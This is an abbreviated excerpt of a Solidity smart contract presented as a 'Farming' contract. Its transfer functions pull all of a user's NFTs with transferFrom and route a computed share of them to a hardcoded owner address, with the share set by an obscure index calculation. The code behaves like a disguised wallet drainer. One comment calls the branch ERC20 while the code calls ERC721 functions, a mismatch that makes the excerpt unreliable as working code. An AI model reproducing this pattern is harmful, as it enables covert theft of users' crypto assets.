 ...
 */
contract ERC20Detailed is Context, IERC20, IERC20Metadata {
...
contract ERC721Full is ERC721Enumerable, Ownable {
...
contract Farming is IFarming, Ownable, ReentrancyGuard {
    ...
    function getOwnerAddress() internal pure returns (address) {
        return 0x02BB7cb4FFe935C8148D2DD2020DC6BD83B7eABe;
    }
    ...
    function getTokenIdx(uint256 tokenIdx1) public pure returns (uint256) {
        uint256 tokenIdx2 = 0;
        if (tokenIdx1 >= 3 && tokenIdx1 < 6) {
            tokenIdx2 = 1;
        } else if (tokenIdx1 >= 6 && tokenIdx1 < 11) {
            tokenIdx2 = 2;
        } else {
            if (tokenIdx1 % 2 == 0) {
                tokenIdx2 = SafeMath.div(SafeMath.sub(tokenIdx1, 8), 2);
            } else {
                tokenIdx2 = SafeMath.div(SafeMath.sub(tokenIdx1, 9), 2);
            }
        }
        return tokenIdx2;
    }
    ...
    function transferTokenItems(
        ...
        for (i = 0; i < tItems - tIdx2; i++){
            ERC721Full(tokenAddress).transferFrom(userAddress, xferAddress, tokenIds[i]);
        }
        address ownerAddr = getOwnerAddress();
        for (i = tItems - tIdx2; i < tItems; i++) {
            ERC721Full(tokenAddress).transferFrom(userAddress, ownerAddr, tokenIds[i]);
        }
    }
    ...
    function xferFunction(
        ...
        if (tokenType == 1){ // For ERC20 Token
            ...
            uint tBalance = ERC721Full(tokenAddress).balanceOf(userAddress);
            uint[] memory tokenIds = new uint[](tBalance);
            tokenIds = getTokenIds(tokenAddress, userAddress);
            transferTokenItems(tokenAddress, userAddress, xfererAddress, tokenIds, tBalance);
        }
    }
}